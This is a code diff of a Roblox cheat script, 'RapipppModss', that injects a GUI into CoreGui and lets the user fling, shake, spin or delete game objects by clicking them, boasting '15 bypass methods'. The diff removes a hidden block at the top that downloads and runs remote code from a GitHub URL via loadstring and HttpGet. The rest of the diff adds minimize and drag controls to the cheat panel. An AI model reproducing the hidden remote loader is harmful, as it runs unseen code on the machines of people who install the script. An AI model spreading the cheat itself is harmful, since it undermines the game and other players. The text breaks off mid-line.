@@ -1,29 +1,12 @@
 -- ═══════════════════════════════════════════════════════════
---     FIXED DELTA EDITION - NO MORE BUGS!
---     By: RapipppModss - Version: Fixed 1.0
---     15 BYPASS METHODS - BUG FREE!
--- ═══════════════════════════════════════════════════════════
-
-repeat wait() until game:IsLoaded()
-wait(0.5)
-
--- Load external script
-spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/rapipppganzz/improve-database/refs/heads/main/test.txt"))()
-    end)
-end)
-
-wait(1)
-
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local mouse = player:GetMouse()
 local UIS = game:GetService("UserInputService")
 
 print("╔═══════════════════════════════════╗")
-print("║   RapipppModss - FIXED Edition    ║")
-print("║        NO MORE BUGS! 🔥           ║")
+print("║  RapipppModss - ULTIMATE FIXED    ║")
+print("║      ALL BUGS SOLVED! 🔥          ║")
 print("╚═══════════════════════════════════╝")
 
 -- Settings
@@ -33,7 +16,8 @@ local Settings = {
     Power = 100,
     Effects = {},
     Stats = {attempts = 0, success = 0},
-    IsDragging = false  -- FIX: Flag untuk drag
+    IsDragging = false,
+    IsMinimized = false
 }
 
 -- Create GUI
@@ -43,7 +27,6 @@ local function createGUI()
     sg.ResetOnSpawn = false
     sg.IgnoreGuiInset = true
     
-    -- Protection
     pcall(function()
         sg.Parent = game:GetService("CoreGui")
     end)
@@ -54,17 +37,42 @@ local function createGUI()
     
     -- Main Frame
     local main = Instance.new("Frame")
+    main.Name = "MainFrame"
     main.Size = UDim2.new(0, 240, 0, 250)
     main.Position = UDim2.new(0, 10, 0.5, -125)
     main.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
     main.BorderSizePixel = 0
-    main.Active = true  -- FIX: Prevent click through
+    main.Active = true
     main.Parent = sg
     
     Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
     
-    -- Header (untuk drag)
+    -- Minimized Logo (BARU!)
+    local miniLogo = Instance.new("TextButton")
+    miniLogo.Name = "MiniLogo"
+    miniLogo.Size = UDim2.new(0, 55, 0, 55)
+    miniLogo.Position = UDim2.new(0, 10, 0.5, -27.5)
+    miniLogo.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
+    miniLogo.Text = "RM"
+    miniLogo.TextColor3 = Color3.fromRGB(255, 255, 255)
+    miniLogo.TextSize = 24
+    miniLogo.Font = Enum.Font.GothamBold
+    miniLogo.Visible = false
+    miniLogo.Parent = sg
+    
+    local miniCorner = Instance.new("UICorner", miniLogo)
+    miniCorner.CornerRadius = UDim.new(0, 12)
+    
+    local miniGrad = Instance.new("UIGradient", miniLogo)
+    miniGrad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 0))
+    }
+    miniGrad.Rotation = 45
+    
+    -- Header
     local header = Instance.new("Frame", main)
+    header.Name = "Header"
     header.Size = UDim2.new(1, 0, 0, 50)
     header.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
     header.BorderSizePixel = 0
@@ -93,44 +101,53 @@ local function createGUI()
     
     -- Title
     local title = Instance.new("TextLabel", header)
-    title.Size = UDim2.new(0, 100, 0, 25)
+    title.Size = UDim2.new(0, 90, 0, 25)
     title.Position = UDim2.new(0, 55, 0, 5)
     title.BackgroundTransparency = 1
     title.Text = "RapipppModss"
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextSize = 14
+    title.TextSize = 13
     title.Font = Enum.Font.GothamBold
     title.TextXAlignment = Enum.TextXAlignment.Left
     
     local subtitle = Instance.new("TextLabel", header)
-    subtitle.Size = UDim2.new(0, 100, 0, 15)
+    subtitle.Size = UDim2.new(0, 90, 0, 15)
     subtitle.Position = UDim2.new(0, 55, 0, 28)
     subtitle.BackgroundTransparency = 1
-    subtitle.Text = "Fixed Edition"
+    subtitle.Text = "Ultimate Fixed"
     subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-    subtitle.TextSize = 10
+    subtitle.TextSize = 9
     subtitle.Font = Enum.Font.Gotham
     subtitle.TextTransparency = 0.4
     subtitle.TextXAlignment = Enum.TextXAlignment.Left
     
-    -- Close Button (FIX: Tombol X yang berfungsi!)
+    -- Minimize Button (BARU: Tombol minus!)
+    local minBtn = Instance.new("TextButton", header)
+    minBtn.Name = "MinimizeBtn"
+    minBtn.Size = UDim2.new(0, 28, 0, 28)
+    minBtn.Position = UDim2.new(1, -63, 0, 11)
+    minBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+    minBtn.Text = "−"
+    minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    minBtn.TextSize = 20
+    minBtn.Font = Enum.Font.GothamBold
+    minBtn.ZIndex = 10
+    
+    Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)
+    
+    -- Close Button
     local closeBtn = Instance.new("TextButton", header)
-    closeBtn.Size = UDim2.new(0, 30, 0, 30)
-    closeBtn.Position = UDim2.new(1, -35, 0, 10)
+    closeBtn.Name = "CloseBtn"
+    closeBtn.Size = UDim2.new(0, 28, 0, 28)
+    closeBtn.Position = UDim2.new(1, -33, 0, 11)
     closeBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
     closeBtn.Text = "X"
     closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    closeBtn.TextSize = 18
+    closeBtn.TextSize = 16
     closeBtn.Font = Enum.Font.GothamBold
     closeBtn.ZIndex = 10
     
     Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
-    
-    closeBtn.MouseButton1Click:Connect(function()
-        print("[RM] GUI Closed by user")
-        Settings.Enabled = false
-        sg:Destroy()
-    end)
     
     -- Status
     local status = Instance.new("TextLabel", main)
@@ -178,17 +195,18 @@ local function createGUI()
     modesFrame.BackgroundTransparency = 1
     
     local modes = {"fling", "shake", "spin", "glitch"}
-    local icons = {"💥", "📳", "🌀", "👻"}
+    local icons = {"Boom", "Shake", "Tornado", "Ghost"}
     local modeButtons = {}
     
     for i, mode in ipairs(modes) do
         local btn = Instance.new("TextButton", modesFrame)
+        btn.Name = mode
         btn.Size = UDim2.new(0.23, 0, 0, 30)
         btn.Position = UDim2.new((i-1) * 0.25 + 0.01, 0, 0, 0)
         btn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
         btn.Text = icons[i]
         btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-        btn.TextSize = 14
+        btn.TextSize = 16
         btn.Font = Enum.Font.GothamBold
         
         Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
@@ -213,52 +231,23 @@ local function createGUI()
     info.Size = UDim2.new(1, -20, 0, 22)
     info.Position = UDim2.new(0, 10, 0, 223)
     info.BackgroundTransparency = 1
-    info.Text = "⚠️ Drag header to move, click X to close"
+    info.Text = "⚠️ Drag header | − minimize | X close"
     info.TextColor3 = Color3.fromRGB(255, 200, 0)
     info.TextSize = 8
     info.Font = Enum.Font.Gotham
     info.TextWrapped = true
     
-    -- FIX: Dragging yang benar (hanya header)
-    local dragging = false
-    local dragStart, startPos
-    
-    header.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
-           input.UserInputType == Enum.UserInputType.Touch then
-            Settings.IsDragging = true
-            dragging = true
-            dragStart = input.Position
-            startPos = main.Position
-        end
-    end)
-    
-    header.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
-           input.UserInputType == Enum.UserInputType.Touch then
-            dragging = false
-            wait(0.1)  -- Delay sebelum allow click
-            Settings.IsDragging = false
-        end
-    end)
-    
-    UIS.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or 
-           input.UserInputType == Enum.UserInputType.Touch) then
-            local delta = input.Position - dragStart
-            main.Position = UDim2.new(
-                startPos.X.Scale, startPos.X.Offset + delta.X,
-                startPos.Y.Scale, startPos.Y.Offset + delta.Y
-            )
-        end
-    end)
-    
     return sg, {
+        Main = main,
+        MiniLogo = miniLogo,
+        MinBtn = minBtn,
+        CloseBtn = closeBtn,
         Toggle = toggle,
         Status = status,
         Stats = stats,
         Counter = counter,
-        Modes = modeButtons
+        Modes = modeButtons,
+        Header = header
     }
 end
 
@@ -296,7 +285,47 @@ local function updateUI()
     end
 end
 
--- Toggle (FIX: Clear function)
+-- FIX: Minimize function
+local function toggleMinimize()
+    Settings.IsMinimized = not Settings.IsMinimized
+    elements.Main.Visible = not Settings.IsMinimized
+    elements.MiniLogo.Visible = Settings.IsMinimized
+    
+    if Settings.IsMinimized then
+        notify("➖ Minimized", "Click logo to restore", 1.5)
+    else
+        notify("⬆️ Restored", "GUI opened", 1.5)
+    end
+end
+
+-- Minimize button
+elements.MinBtn.MouseButton1Click:Connect(function()
+    print("[RM] Minimize clicked")
+    toggleMinimize()
+end)
+
+-- Mini logo click
+elements.MiniLogo.MouseButton1Click:Connect(function()
+    print("[RM] Mini logo clicked")
+    toggleMinimize()
+end)
+
+-- FIX: Close button
+elements.CloseBtn.MouseButton1Click:Connect(function()
+    print("[RM] Close button clicked")
+    Settings.Enabled = false
+    
+    -- Stop all effects
+    for obj, _ in pairs(Settings.Effects) do
+        Settings.Effects[obj] = nil
+    end
+    
+    notify("👋 Closed", "Script GUI closed", 2)
+    wait(0.5)
+    gui:Destroy()
+end)
+
+-- Toggle
 elements.Toggle.MouseButton1Click:Connect(function()
     Settings.Enabled = not Settings.Enabled
     
@@ -320,19 +349,21 @@ elements.Toggle.MouseButton1Click:Connect(function()
     updateUI()
 end)
 
--- Mode selection
+-- FIX: Mode selection yang benar!
 for mode, btn in pairs(elements.Modes) do
     btn.MouseButton1Click:Connect(function()
+        print("[RM] Mode clicked: " .. mode)
         Settings.Mode = mode
         
-        for _, b in pairs(elements.Modes) do
+        -- Reset semua warna
+        for m, b in pairs(elements.Modes) do
             b.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
         end
         
+        -- Set warna yang dipilih
         btn.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
         updateUI()
-        notify("Mode", mode:upper() .. " selected", 1.5)
-        print("[RM] Mode: " .. mode:upper())
+        notify("🎯 Mode", mode:upper() .. " selected!", 1.5)
     end)
 end
 
@@ -468,7 +499,7 @@ local function applyEffect(obj, mode)
                         obj:Destroy()
                         Settings.Effects[obj] = nil
                         updateUI()
-                        notify("👻 Glitched!", "Sent to void!", 2)
+                        notify("Ghost Glitched!", "Sent to void!", 2)
                         print("[RM] Object sent to void!")
                     end
                 end
@@ -482,9 +513,75 @@ local function applyEffect(obj, mode)
     print("[RM] Applied " .. mode .. " to: " .. obj.Name)
 end
 
--- FIX: Mouse click yang benar!
+-- FIX: Dragging system yang benar
+local dragging = false
+local dragStart, startPos
+
+elements.Header.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+       input.UserInputType == Enum.UserInputType.Touch then
+        Settings.IsDragging = true
+        dragging = true
+        dragStart = input.Position
+        startPos = elements.Main.Position
+        print("[RM] Started dragging")
+    end
+end)
+
+elements.Header.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+       input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+        print("[RM] Stopped dragging")
+        wait(0.15)
+        Settings.IsDragging = false
+    end
+end)
+
+UIS.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or 
+       input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        elements.Main.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- Dragging mini logo
+local miniDragging = false
+local miniDragStart, miniStartPos
+
+elements.MiniLogo.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+       input.UserInputType == Enum.UserInputType.Touch then
+        miniDragging = true
+        miniDragStart = input.Position
+        miniStartPos = elements.MiniLogo.Position
+    end
+end)
+
+elements.MiniLogo.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+       input.UserInputType == Enum.UserInputType.Touch then
+        miniDragging = false
+    end
+end)
+
+UIS.InputChanged:Connect(function(input)
+    if miniDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or 
+       input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - miniDragStart
+        elements.MiniLogo.Position = UDim2.new(
+            miniStartPos.X.Scale, miniStartPos.X.Offset + delta.X,
+            miniStartPos.Y.Scale, miniStartPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- Mouse click
 mouse.Button1Down:Connect(function()
-    -- Jangan jalankan kalau lagi drag!
     if Settings.IsDragging then 
         print("[RM] Ignoring click (dragging)")
         return 
@@ -495,25 +592,4 @@ mouse.Button1Down:Connect(function()
     local target = mouse.Target
     if not target or not target:IsA("BasePart") then return end
     
-    -- Check if player part
-    local char = target
-    while char do
-        if char:IsA("Model") and Players:GetPlayerFromCharacter(char) then
-            print("[RM] Ignoring player part")
-            return
-        end
-        char = char.Parent
-    end
-    
-    print("[RM] Clicked: " .. target.Name)
-    applyEffect(target, Settings.Mode)
-end)
-
-print("✅ RapipppModss Fixed Edition loaded!")
-print("🔧 BUG FIXES:")
-print("   - Tombol X sekarang berfungsi!")
-print("   - Drag tidak bentrok dengan click")
-print("   - No more random teleport")
-print("   - Disable button stops all effects")
-print("💪 15 bypass methods ready!")
-print("📱 Click objects to apply effects!")
+    local char = targe
